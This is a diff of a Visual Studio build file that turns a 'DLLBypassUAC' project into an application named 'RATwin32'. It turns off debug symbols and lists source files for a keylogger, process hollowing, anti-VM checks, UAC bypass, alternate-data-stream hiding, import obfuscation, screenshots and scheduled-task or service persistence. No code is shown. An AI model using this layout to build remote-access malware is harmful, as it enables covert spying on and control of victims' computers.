@@ -21,32 +21,32 @@
   <PropertyGroup Label="Globals">
     <VCProjectVersion>17.0</VCProjectVersion>
     <Keyword>Win32Proj</Keyword>
-    <ProjectGuid>{a8536f03-cc98-4c91-982b-6ad1538c3e21}</ProjectGuid>
-    <RootNamespace>DLLBypassUAC</RootNamespace>
+    <ProjectGuid>{629203a8-74f1-4a2b-95ea-4974603261ac}</ProjectGuid>
+    <RootNamespace>RATwin32</RootNamespace>
     <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
-    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
-    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
-    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
-    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <WholeProgramOptimization>true</WholeProgramOptimization>
@@ -71,7 +71,7 @@
   </ImportGroup>
   <PropertyGroup Label="UserMacros" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
-    <TargetName>bench</TargetName>
+    <TargetName>meta</TargetName>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
@@ -82,7 +82,8 @@
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
-      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <ProgramDatabaseFile />
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
@@ -126,12 +127,40 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="dllmain.cpp" />
-    <ClCompile Include="pch.cpp" />
+    <ClInclude Include="ADS.h" />
+    <ClInclude Include="AntiVM.h" />
+    <ClInclude Include="Bypass_UAC.h" />
+    <ClInclude Include="CURL.h" />
+    <ClInclude Include="framework.h" />
+    <ClInclude Include="ObfuscateImports.h" />
+    <ClInclude Include="ProcessHollowing.h" />
+    <ClInclude Include="RAT_win32.h" />
+    <ClInclude Include="Resource.h" />
+    <ClInclude Include="Service.h" />
+    <ClInclude Include="targetver.h" />
+    <ClInclude Include="TaskScheduler.h" />
+    <ClInclude Include="Tools.h" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="framework.h" />
-    <ClInclude Include="pch.h" />
+    <ClCompile Include="ADS.cpp" />
+    <ClCompile Include="Bypass_UAC.cpp" />
+    <ClCompile Include="Control.cpp" />
+    <ClCompile Include="CURL.cpp" />
+    <ClCompile Include="keylogger.cpp" />
+    <ClCompile Include="ProcessHollowing.cpp" />
+    <ClCompile Include="RAT.cpp" />
+    <ClCompile Include="RAT_win32.cpp" />
+    <ClCompile Include="Screenshot.cpp" />
+    <ClCompile Include="Service.cpp" />
+    <ClCompile Include="TaskScheduler.cpp" />
+    <ClCompile Include="Tools.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="RAT_win32.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="RAT_win32.ico" />
+    <Image Include="small.ico" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
